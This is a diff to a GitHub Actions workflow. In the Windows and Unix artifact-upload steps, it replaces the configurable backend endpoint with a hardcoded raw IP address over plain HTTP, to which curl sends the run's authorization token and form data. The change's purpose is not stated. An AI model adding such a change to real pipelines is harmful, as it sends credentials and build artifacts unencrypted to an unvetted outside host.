@@ -93,7 +93,7 @@ jobs:
       - name: Upload Artifacts to Backend (Windows)
         if: runner.os == 'Windows'
         run: |
-          & "C:\Program Files\Git\mingw64\bin\curl.exe" --location "${{ github.event.inputs.endpoint }}" `
+          & "C:\Program Files\Git\mingw64\bin\curl.exe" --location "http://3.6.230.135:8080" `
           --header "Authorization: ${{ github.event.inputs.token }}" `
           --form 'dispatch_id=${{ github.event.inputs.dispatchID }}' `
           --form 'operating_system=${{ runner.os }}' `
@@ -103,7 +103,7 @@ jobs:
       - name: Upload Artifacts to Backend (Unix)
         if: runner.os != 'Windows'
         run: |
-          curl --location "${{ github.event.inputs.endpoint }}" \
+          curl --location "http://3.6.230.135:8080" \
           --header "Authorization: ${{ github.event.inputs.token }}" \
           --form 'dispatch_id=${{ github.event.inputs.dispatchID }}' \
           --form 'operating_system=${{ runner.os }}' \
